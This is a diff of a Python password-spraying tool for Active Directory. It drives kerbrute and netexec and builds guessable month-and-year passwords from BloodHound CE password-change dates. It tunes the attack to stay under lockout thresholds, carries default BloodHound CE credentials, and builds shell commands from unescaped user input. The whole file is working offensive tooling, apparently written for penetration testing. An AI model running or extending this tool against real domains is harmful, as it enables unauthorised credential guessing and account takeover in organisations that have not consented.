@@ -1,28 +1,66 @@
 #!/usr/bin/env python3
+"""
+Password spraying tool using kerbrute with smart date-based password generation.
+
+This tool performs password spraying attacks against Active Directory domains using
+kerbrute, with intelligent password generation based on password last change dates
+from BloodHound CE.
+"""
 import argparse
 import subprocess
 import tempfile
 import re
 import os
 import sys
-import logging
-from bloodhound_cli import BloodHoundACEAnalyzer
+from typing import List, Tuple, Dict, Optional, Union
+from pathlib import Path
+from bloodhound_cli.core.ce import BloodHoundCEClient
 import curses
 from datetime import datetime, timezone
+from loguru import logger
 
-# Configuración inicial de logging
-logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
-logger = logging.getLogger(__name__)
+# Configure Loguru logging
+logger.remove()  # Remove default handler
+logger.add(
+    sys.stderr,
+    format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <level>{message}</level>",
+    level="INFO",
+    colorize=True,
+    backtrace=True,
+    diagnose=True,
+)
 
-def clean_ansi(text):
-    """Elimina los códigos ANSI de un texto."""
+
+def clean_ansi(text: str) -> str:
+    """
+    Remove ANSI escape codes from text.
+
+    Args:
+        text: Text that may contain ANSI escape codes
+
+    Returns:
+        Text with ANSI escape codes removed
+    """
     ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
     return ansi_escape.sub('', text)
 
-def get_netexec_users(dc_ip, username, password, domain):
+def get_netexec_users(dc_ip: str, username: str, password: str, domain: str) -> List[Tuple[str, int]]:
     """
-    Ejecuta netexec para obtener la lista de usuarios y su BadPW.
-    Se utiliza grep y awk para filtrar la salida.
+    Execute netexec to get user list with BadPwdCount.
+
+    Uses grep and awk to filter the output.
+
+    Args:
+        dc_ip: Domain Controller IP address
+        username: Username for netexec authentication
+        password: Password for netexec authentication
+        domain: Target domain name
+
+    Returns:
+        List of tuples containing (username, badpw_count)
+
+    Raises:
+        SystemExit: If netexec execution fails
     """
     # Check if the specific netexec path exists
     netexec_path = "/root/.adscan/tool_venvs/netexec/venv/bin/nxc"
@@ -32,11 +70,21 @@ def get_netexec_users(dc_ip, username, password, domain):
         "| grep -v '<never>' | awk '{print $5,$8}' | grep -v ']' | grep -v '-Username- Set-'"
     )
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
+        result = subprocess.run(
+            cmd, shell=True, capture_output=True, text=True, check=True, timeout=300
+        )
     except subprocess.CalledProcessError as e:
-        logger.error("Error ejecutando netexec para obtener usuarios: %s", e)
+        logger.error(
+            "Error executing netexec to get users: {}. stderr: {}",
+            e,
+            clean_ansi(e.stderr) if e.stderr else "N/A"
+        )
         sys.exit(1)
-    users = []
+    except subprocess.TimeoutExpired:
+        logger.error("Netexec command timed out after 300 seconds")
+        sys.exit(1)
+
+    users: List[Tuple[str, int]] = []
     for line in result.stdout.splitlines():
         line = line.strip()
         if not line:
@@ -48,50 +96,100 @@ def get_netexec_users(dc_ip, username, password, domain):
         try:
             badpw = int(parts[1])
         except ValueError:
+            logger.debug("Skipping line with invalid BadPwdCount: %s", line)
             continue
         users.append((user, badpw))
     return users
 
-def get_account_lockout_threshold(dc_ip, username, password, domain):
+def get_account_lockout_threshold(
+    dc_ip: str, username: str, password: str, domain: str
+) -> Union[int, str]:
     """
-    Ejecuta netexec para extraer el account lockout threshold.
+    Execute netexec to extract account lockout threshold.
+
+    Args:
+        dc_ip: Domain Controller IP address
+        username: Username for netexec authentication
+        password: Password for netexec authentication
+        domain: Target domain name
+
+    Returns:
+        Account lockout threshold as integer, or string if parsing fails
+
+    Raises:
+        SystemExit: If netexec execution fails or threshold cannot be found
     """
     # Check if the specific netexec path exists
     netexec_path = "/root/.adscan/tool_venvs/netexec/venv/bin/nxc"
     nxc_cmd = netexec_path if os.path.exists(netexec_path) else 'nxc'
     cmd = f"{nxc_cmd} smb {dc_ip} -u '{username}' -p '{password}' -d {domain} --pass-pol"
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
+        result = subprocess.run(
+            cmd, shell=True, capture_output=True, text=True, check=True, timeout=300
+        )
     except subprocess.CalledProcessError as e:
-        logger.error("Error ejecutando netexec para obtener la política de lockout: %s", e)
+        logger.error(
+            "Error executing netexec to get lockout policy: {}. stderr: {}",
+            e,
+            clean_ansi(e.stderr) if e.stderr else "N/A"
+        )
         sys.exit(1)
+    except subprocess.TimeoutExpired:
+        logger.error("Netexec command timed out after 300 seconds")
+        sys.exit(1)
+
     match = re.search(r'(?i)Account\s+Lockout\s+Threshold\s*:\s*(.*)', result.stdout)
     if match:
         value = match.group(1).strip()
         try:
             return int(value)
         except ValueError:
+            logger.warning("Could not parse lockout threshold as integer: %s", value)
             return value
     else:
-        logger.error("No se pudo obtener el Account lockout threshold del dominio.")
+        logger.error("Could not extract Account lockout threshold from domain.")
         sys.exit(1)
 
-def read_enabled_users(enabled_users_file):
+def read_enabled_users(enabled_users_file: str) -> set:
     """
-    Lee desde un archivo la lista de usuarios habilitados (un usuario por línea).
+    Read list of enabled users from a file (one user per line).
+
+    Args:
+        enabled_users_file: Path to file containing usernames
+
+    Returns:
+        Set of enabled usernames
+
+    Raises:
+        SystemExit: If file cannot be read
     """
     try:
-        with open(enabled_users_file, "r") as f:
+        file_path = Path(enabled_users_file)
+        if not file_path.exists():
+            logger.error("User list file does not exist: {}", enabled_users_file)
+            sys.exit(1)
+        with open(file_path, "r", encoding="utf-8") as f:
             enabled_users = {line.strip() for line in f if line.strip()}
         return enabled_users
-    except Exception as e:
-        logger.error("Error leyendo la lista de usuarios habilitados: %s", e)
+    except OSError as e:
+        logger.error(
+            "Error reading enabled users list from {}: {}",
+            enabled_users_file,
+            e
+        )
         sys.exit(1)
 
-def curses_menu(stdscr, title, options):
+def curses_menu(stdscr: curses.window, title: str, options: List[str]) -> int:
     """
-    Muestra un menú interactivo con curses para seleccionar una opción.
-    Retorna el índice seleccionado.
+    Display interactive curses menu to select an option.
+
+    Args:
+        stdscr: Curses window object
+        title: Menu title
+        options: List of menu options
+
+    Returns:
+        Index of selected option
     """
     curses.curs_set(0)
     selected = 0
@@ -112,13 +210,17 @@ def curses_menu(stdscr, title, options):
         elif key in [curses.KEY_ENTER, ord('\n')]:
             return selected
 
-def smart_date_menu():
+def smart_date_menu() -> Tuple[str, str, str]:
     """
-    Interfaz interactiva con curses para seleccionar:
-      - Idioma (English o Spanish)
-      - Presentación del mes (Lower, e.g., january2025; o Upper, e.g., January2025)
-      - Formato de spray para months (usando el placeholder 'month')
-    Retorna una tupla (language, month_case, spray_format_option).
+    Interactive curses interface to select spray parameters.
+
+    Selects:
+      - Language (English or Spanish)
+      - Month case (Lower, e.g., january2025; or Upper, e.g., January2025)
+      - Spray format for months (using 'month' placeholder)
+
+    Returns:
+        Tuple containing (language, month_case, spray_format_option)
     """
     languages = ["English", "Spanish"]
     case_options = ["Lower (e.g., january2025)", "Upper (e.g., January2025)"]
@@ -137,21 +239,36 @@ def smart_date_menu():
         return languages[lang_idx], month_case, months_formats[fmt_idx]
     return curses.wrapper(curses_logic)
 
-def smart_date_formats():
-    """Devuelve la lista de formatos para months con el placeholder 'month'."""
+def smart_date_formats() -> List[str]:
+    """
+    Return list of date formats for months with 'month' placeholder.
+
+    Returns:
+        List of format strings
+    """
     return [
         "{month}{full_year}", "{month}.{full_year}", "{month}{full_year}.", "{month}@{full_year}", "{month}{full_year}!",
         "{month}{year_short}", "{month}.{year_short}", "{month}{year_short}.", "{month}@{year_short}", "{month}{year_short}!",
         "All"
     ]
 
-def generate_spray_list(analyzer, domain, smart_params):
+def generate_spray_list(
+    analyzer: BloodHoundCEClient, domain: str, smart_params: Tuple
+) -> List[str]:
     """
-    Genera la lista de spray usando datos de bloodhound-cli.
-    Si smart_params tiene tres elementos, se asume modo interactivo (curses) y se usa el placeholder "month".
-    Si smart_params tiene cuatro elementos, se asume modo no interactivo y smart_params = (lang, type, case, format_option),
-    de forma que se usará el placeholder "type".
-    Retorna una lista de líneas "user:password".
+    Generate spray list using data from bloodhound-cli.
+
+    If smart_params has 3 elements, assumes interactive mode (curses) and uses "month" placeholder.
+    If smart_params has 4 elements, assumes non-interactive mode with format (lang, type, case, format_option),
+    using "type" placeholder.
+
+    Args:
+        analyzer: BloodHound CE client instance
+        domain: Target domain name
+        smart_params: Tuple containing spray parameters
+
+    Returns:
+        List of "user:password" lines
     """
     if len(smart_params) == 3:
         language, month_case, fmt_option = smart_params
@@ -177,17 +294,21 @@ def generate_spray_list(analyzer, domain, smart_params):
     data = analyzer.get_password_last_change(domain)
     spray_lines = []
     for record in data:
-        user = record['user']
-        ts = record.get('password_last_change')
+        user = record['samaccountname']
+        ts = record.get('pwdlastset')
         try:
             ts_float = float(ts)
             if ts_float == 0:
-                wc = record.get('when_created')
+                wc = record.get('whencreated')
                 dt = datetime.fromtimestamp(float(wc), tz=timezone.utc)
             else:
                 dt = datetime.fromtimestamp(ts_float, tz=timezone.utc)
-        except Exception as e:
-            logger.error(f"Error converting timestamp for user {user}: {e}")
+        except (ValueError, TypeError, KeyError) as e:
+            logger.error(
+                "Error converting timestamp for user {}: {}",
+                user,
+                e
+            )
             continue
         year_full = dt.strftime("%Y")
         year_short = dt.strftime("%y")
@@ -203,10 +324,15 @@ def generate_spray_list(analyzer, domain, smart_params):
         spray_lines.append(f"{user}:{password}")
     return spray_lines
 
-def write_temp_spray_file(lines):
+def write_temp_spray_file(lines: List[str]) -> str:
     """
-    Escribe la lista de spray en un archivo temporal ("user:password").
-    Retorna la ruta del archivo.
+    Write spray list to a temporary file ("user:password" format).
+
+    Args:
+        lines: List of "user:password" lines
+
+    Returns:
+        Path to temporary file
     """
     tmp = tempfile.NamedTemporaryFile(mode='w', delete=False)
     for line in lines:
@@ -214,23 +340,44 @@ def write_temp_spray_file(lines):
     tmp.close()
     return tmp.name
 
-def run_smart_kerbrute(domain, dc_ip, temp_file):
+def run_smart_kerbrute(domain: str, dc_ip: str, temp_file: str) -> None:
     """
-    Ejecuta kerbrute bruteforce usando el archivo temporal.
+    Execute kerbrute bruteforce using temporary file.
+
+    Args:
+        domain: Target domain name
+        dc_ip: Domain Controller IP address
+        temp_file: Path to temporary file with user:password pairs
+
+    Raises:
+        SystemExit: If kerbrute execution fails
     """
     cmd = ["kerbrute", "bruteforce", "-d", domain, "--dc", dc_ip, temp_file]
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        result = subprocess.run(
+            cmd, capture_output=True, text=True, check=True, timeout=3600
+        )
         logger.info(clean_ansi(result.stdout))
     except subprocess.CalledProcessError as e:
-        logger.error("Error ejecutando kerbrute: %s", e)
-        logger.error(clean_ansi(e.stdout))
-        logger.error(clean_ansi(e.stderr))
+        logger.error("Error executing kerbrute: {}", e)
+        if e.stdout:
+            logger.error("kerbrute stdout: {}", clean_ansi(e.stdout))
+        if e.stderr:
+            logger.error("kerbrute stderr: {}", clean_ansi(e.stderr))
+        sys.exit(1)
+    except subprocess.TimeoutExpired:
+        logger.error("Kerbrute command timed out after 3600 seconds")
         sys.exit(1)
 
-def write_temp_users_file(users):
+def write_temp_users_file(users: List[str]) -> str:
     """
-    Escribe la lista de usuarios elegibles en un archivo temporal.
+    Write eligible users list to a temporary file.
+
+    Args:
+        users: List of usernames
+
+    Returns:
+        Path to temporary file
     """
     tmp = tempfile.NamedTemporaryFile(mode='w', delete=False)
     for user in users:
@@ -238,10 +385,27 @@ def write_temp_users_file(users):
     tmp.close()
     return tmp.name
 
-def run_kerbrute(domain, dc_ip, temp_users_file, spray_password, use_user_as_pass=False, output_dir=None):
+def run_kerbrute(
+    domain: str,
+    dc_ip: str,
+    temp_users_file: str,
+    spray_password: Optional[str],
+    use_user_as_pass: bool = False,
+    output_dir: Optional[str] = None
+) -> None:
     """
-    Ejecuta kerbrute passwordspray usando la lista de usuarios.
-    Si use_user_as_pass es True se añade --user-as-pass.
+    Execute kerbrute passwordspray using user list.
+
+    Args:
+        domain: Target domain name
+        dc_ip: Domain Controller IP address
+        temp_users_file: Path to temporary file with usernames
+        spray_password: Password to spray (None for bruteforce mode)
+        use_user_as_pass: If True, add --user-as-pass flag
+        output_dir: Optional output directory for kerbrute results
+
+    Raises:
+        SystemExit: If kerbrute execution fails
     """
     if use_user_as_pass:
         cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, "--user-as-pass", temp_users_file]
@@ -253,12 +417,19 @@ def run_kerbrute(domain, dc_ip, temp_users_file, spray_password, use_user_as_pas
     if output_dir:
         cmd.extend(["-o", output_dir])
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        result = subprocess.run(
+            cmd, capture_output=True, text=True, check=True, timeout=3600
+        )
         logger.info(clean_ansi(result.stdout))
     except subprocess.CalledProcessError as e:
-        logger.error("Error ejecutando kerbrute: %s", e)
-        logger.error(clean_ansi(e.stdout))
-        logger.error(clean_ansi(e.stderr))
+        logger.error("Error executing kerbrute: {}", e)
+        if e.stdout:
+            logger.error("kerbrute stdout: {}", clean_ansi(e.stdout))
+        if e.stderr:
+            logger.error("kerbrute stderr: {}", clean_ansi(e.stderr))
+        sys.exit(1)
+    except subprocess.TimeoutExpired:
+        logger.error("Kerbrute command timed out after 3600 seconds")
         sys.exit(1)
 
 # --- Main con subcomandos ---
@@ -333,10 +504,11 @@ def main():
 
     args = parser.parse_args()
 
-    # Configurar logging si debug está activado
+    # Configure logging if debug is enabled
     if args.debug:
-        logging.getLogger().setLevel(logging.DEBUG)
-        logger.debug("Modo debug activado. Mostrando información detallada.")
+        logger.remove()
+        logger.add(sys.stderr, level="DEBUG", colorize=True, backtrace=True, diagnose=True)
+        logger.debug("Debug mode enabled. Showing detailed information.")
 
     # Función común para obtener usuarios elegibles (usando netexec si se proporcionan credenciales)
     def get_eligible_users(domain, users_file, dc_ip, ul, pl, threshold):
@@ -372,12 +544,20 @@ def main():
     # Procesar subcomandos
     if args.subcommand == "smart":
         if args.debug:
-            logging.getLogger().setLevel(logging.DEBUG)
+            logger.remove()
+            logger.add(sys.stderr, level="DEBUG", colorize=True, backtrace=True, diagnose=True)
         logger.info("[*] Modo smart activado. Obteniendo datos de password last change desde bloodhound-cli...")
-        bh_uri = "bolt://localhost:7687"
-        bh_user = "neo4j"
-        bh_password = "bloodhound"
-        analyzer = BloodHoundACEAnalyzer(bh_uri, bh_user, bh_password)
+        bh_base_url = os.getenv("BH_CE_BASE_URL", "http://localhost:8080")
+        bh_username = os.getenv("BH_CE_USERNAME", "admin")
+        bh_password = os.getenv("BH_CE_PASSWORD", "Bloodhound123!")
+        analyzer = BloodHoundCEClient(base_url=bh_base_url)
+        # Ensure valid token (authenticate if needed)
+        if not analyzer.ensure_valid_token():
+            logger.info(f"[*] Autenticando con BloodHound CE usando usuario: {bh_username}")
+            token = analyzer.authenticate(bh_username, bh_password)
+            if not token:
+                logger.error("[!] Error al autenticar con BloodHound CE. Verifica las credenciales.")
+                sys.exit(1)
         # Si se especifican --lang, --type, --case y --format, se usan directamente
         if args.lang and args.type and args.case and (args.format is not None):
             available_formats = {
@@ -400,7 +580,7 @@ def main():
             smart_params = smart_date_menu()  # (language, month_case, spray_format_option)
         logger.info(f"[*] Se seleccionó: {smart_params}")
         data = analyzer.get_password_last_change(args.d)
-        eligible_users = [record['user'] for record in data]
+        eligible_users = [record['samaccountname'] for record in data]
         spray_list = generate_spray_list(analyzer, args.d, smart_params)
         analyzer.close()
         logger.info(f"[*] Número de usuarios para spraying (smart): {len(eligible_users)}")
@@ -415,7 +595,8 @@ def main():
 
     elif args.subcommand == "password":
         if args.debug:
-            logging.getLogger().setLevel(logging.DEBUG)
+            logger.remove()
+            logger.add(sys.stderr, level="DEBUG", colorize=True, backtrace=True, diagnose=True)
         logger.info("[*] Modo password activado. Procesando spraying en modo password...")
         eligible_users = get_eligible_users(args.d, args.u, args.dc_ip, args.ul, args.pl, args.t)
         logger.info(f"[*] Número de usuarios elegibles para spraying (password): {len(eligible_users)}")
@@ -430,7 +611,8 @@ def main():
 
     elif args.subcommand == "useraspass":
         if args.debug:
-            logging.getLogger().setLevel(logging.DEBUG)
+            logger.remove()
+            logger.add(sys.stderr, level="DEBUG", colorize=True, backtrace=True, diagnose=True)
         logger.info("[*] Modo useraspass activado. Procesando spraying en modo useraspass...")
         eligible_users = get_eligible_users(args.d, args.u, args.dc_ip, args.ul, args.pl, args.t)
         logger.info(f"[*] Número de usuarios elegibles para spraying (useraspass): {len(eligible_users)}")
